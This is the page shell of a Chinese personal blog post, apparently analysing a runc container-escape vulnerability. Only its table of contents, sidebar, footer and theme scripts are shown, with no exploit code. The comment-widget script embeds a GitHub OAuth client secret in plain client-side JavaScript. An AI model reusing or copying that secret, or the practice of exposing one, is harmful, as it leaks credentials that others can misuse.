          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">漏洞原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#proc"><span class="nav-number">1.1.</span> <span class="nav-text">proc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pid-namespace"><span class="nav-number">1.2.</span> <span class="nav-text">pid namespace</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞成因</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#runc%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">runc启动容器过程分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#runc-run-command"><span class="nav-number">2.1.</span> <span class="nav-text">runc run command</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#startContainer"><span class="nav-number">2.2.</span> <span class="nav-text">startContainer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#createContainer"><span class="nav-number">2.3.</span> <span class="nav-text">createContainer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#libcontainer-Create"><span class="nav-number">2.4.</span> <span class="nav-text">libcontainer.Create</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#runner-run"><span class="nav-number">2.5.</span> <span class="nav-text">runner.run</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Container-Run"><span class="nav-number">2.6.</span> <span class="nav-text">Container.Run</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Container-Start"><span class="nav-number">2.7.</span> <span class="nav-text">Container.Start</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Container-start"><span class="nav-number">2.8.</span> <span class="nav-text">Container.start</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#newParentProcess"><span class="nav-number">2.9.</span> <span class="nav-text">newParentProcess</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#parent-start"><span class="nav-number">2.10.</span> <span class="nav-text">parent.start</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#p-cmd-Start"><span class="nav-number">2.11.</span> <span class="nav-text">p.cmd.Start</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nsexec"><span class="nav-number">2.12.</span> <span class="nav-text">nsexec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#StartInitialization"><span class="nav-number">2.13.</span> <span class="nav-text">StartInitialization</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LinuxStandard-Init"><span class="nav-number">2.14.</span> <span class="nav-text">LinuxStandard.Init</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Poc%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">Poc分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">内核流程分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">5.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Plucky</p>
  <div class="site-description" itemprop="description">记录</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">99</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">30</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">23</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Plucky923" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Plucky923" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:p1ucky@163.com" title="E-Mail → mailto:p1ucky@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Plucky</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">Symbols count total: </span>
    <span title="Symbols count total">1.6m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">Reading time total &asymp;</span>
    <span title="Reading time total">47:01</span>
</div>

<!--
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>-->

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>

<script src="/js/bookmark.js"></script>




  




  
<script src="/js/local-search.js"></script>











<script>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'forest',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : '3420f2814bb4c3c82f84',
      clientSecret: '9d285617447c550188bd893fc3aad7c9b00f2d00',
      repo        : 'Blog-talk',
      owner       : 'Plucky923',
      admin       : ['Plucky923'],
      id          : '0db4facf4aa705c3e926fa3d31d0d575',
        language: 'zh-CH',
      distractionFreeMode: true
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/clicklove.js"></script>
